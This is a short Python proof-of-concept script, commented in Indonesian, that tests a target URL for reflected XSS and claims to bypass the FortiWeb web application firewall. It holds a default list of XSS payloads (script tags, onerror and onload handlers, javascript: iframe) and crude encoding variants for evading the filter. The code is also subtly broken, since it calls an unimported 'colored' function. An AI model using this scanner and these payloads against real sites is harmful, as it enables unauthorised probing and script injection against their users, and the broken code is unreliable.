import requests
import argparse
import logging
from urllib.parse import quote
import sys

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_xss(url, payload):
    """Menguji kerentanan XSS dengan payload tertentu."""
    try:
        encoded_payload = quote(payload) # Encode payload untuk URL
        response = requests.get(f"{url}?key={encoded_payload}")
        if payload in response.text:
            logging.warning(colored(f"Potensi XSS terdeteksi dengan payload: {payload}", "red"))
            return True
        else:
            logging.info(f"Payload {payload} tidak berhasil.")
            return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Error saat mengirim permintaan: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="PoC XSS Reflected dengan Bypass FortiWeb")
    parser.add_argument("url", help="URL target")
    parser.add_argument("-f", "--file", help="File berisi daftar payload XSS (opsional)")
    args = parser.parse_args()

    # Payload XSS default
    default_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    ]

    # Membaca payload dari file jika diberikan
    if args.file:
        with open(args.file, "r") as f:
            payloads = [line.strip() for line in f]
    else:
        payloads = default_payloads

    logging.info(f"Mulai pengujian XSS pada {args.url}")

    for payload in payloads:
        logging.info(f"Menguji payload: {payload}")
        
        # Bypass FortiWeb dengan beberapa teknik
        if test_xss(args.url, payload):
            break  # Jika berhasil, tidak perlu mencoba payload lain
        if test_xss(args.url, payload.replace("<", "%3C")):  # Bypass dengan encoding HTML
            break
        if test_xss(args.url, payload.replace(" ", "%20")):  # Bypass dengan encoding URL
            break
        # Tambahkan teknik bypass FortiWeb lainnya di sini...

if __name__ == "__main__":
    main()
